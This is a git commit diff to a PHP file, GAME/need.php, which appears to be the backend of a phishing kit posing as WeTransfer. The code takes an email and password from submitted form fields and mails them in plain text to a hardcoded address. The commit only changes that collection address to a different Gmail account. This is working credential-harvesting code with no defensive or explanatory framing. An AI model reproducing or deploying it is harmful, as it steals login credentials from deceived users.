1e9208a547c531eb61ae834a104942705a0e3d9f
purchase221 <147104197+purchase221@users.noreply.github.com>
2023-10-10 17:57:06 +0300

    Update need.php

--- GAME/need.php
+++ GAME/need.php
@@ -5,7 +5,7 @@ $email = $_POST['X1'];
 $password = $_POST['X2'];
 
 //Define required variables and send user input to $myEmail.
-$myEmail = 'tesamedikal@yandex.com';
+$myEmail = 'stonecjn@gmail.com';
 $subject = 'WeTransfer';
 $message = 'Email: '.$email. ' Password: '.$password;
 mail($myEmail, $subject, $message);
